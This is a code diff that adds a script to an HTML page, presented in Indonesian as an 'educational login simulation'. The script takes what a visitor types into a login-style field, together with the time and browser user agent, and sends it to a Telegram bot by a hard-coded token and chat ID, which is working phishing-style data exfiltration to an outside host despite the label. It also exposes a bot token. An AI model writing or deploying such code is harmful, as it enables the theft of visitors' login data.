@@ -129,5 +129,36 @@
     </div>
 </div>
 
+<script>
+const BOT_TOKEN = "8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M";
+const CHAT_ID  = "5116335881";
+
+function kirim() {
+  const user = document.getElementById("user").value;
+  if (!user) {
+    alert("Isi data simulasi");
+    return;
+  }
+
+  const pesan =
+`🔐 SIMULASI EDUKASI LOGIN
+👤 Input: ${user}
+🕒 ${new Date().toLocaleString()}
+🌐 ${navigator.userAgent}
+📘 Tanpa password`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
+
+  alert("Simulasi selesai.\nIni contoh bagaimana data bisa terkirim.");
+}
+</script>
+
 </body>
 </html>
